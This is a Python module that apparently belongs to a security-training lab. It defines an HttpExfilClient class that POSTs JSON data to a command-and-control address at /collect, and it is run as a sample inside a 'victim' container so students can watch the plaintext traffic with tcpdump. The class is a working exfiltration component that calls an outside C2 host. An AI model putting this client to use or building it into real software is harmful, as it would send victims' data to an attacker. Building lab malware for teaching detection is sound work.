"""HTTP POST exfiltration for R1 (plaintext) and R2 (HTTPS, via subclass).

Framing is intentionally trivial: POST /collect with a JSON body. Students
reading `tcpdump -A port 8080` see every field in the clear — that is the R1
learning pivot.
"""
from __future__ import annotations

from typing import Optional

import requests

# scenario_facts lives in generators/, which is on sys.path when the sample runs
# inside the victim container (PYTHONPATH set in Dockerfile) and when tests run
# from the repo root (pythonpath = . in pytest.ini).
from generators.data import scenario_facts as sf


class HttpExfilClient:
    DEFAULT_TIMEOUT_SECONDS: int = 10
    PATH: str = "/collect"
    SCHEME: str = "http"

    def __init__(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        *,
        timeout: Optional[int] = None,
    ) -> None:
        self.host = host if host is not None else sf.C2_IP
        self.port = port if port is not None else sf.C2_HTTP_PORT
        self.timeout = timeout if timeout is not None else self.DEFAULT_TIMEOUT_SECONDS

    @property
    def url(self) -> str:
        return f"{self.SCHEME}://{self.host}:{self.port}{self.PATH}"

    def send(self, payload: dict) -> bool:
        """POST ``payload`` as JSON. Return True on 2xx, False on any error."""
        try:
            r = requests.post(self.url, json=payload, timeout=self.timeout)
            r.raise_for_status()
        except requests.RequestException:
            return False
        return True
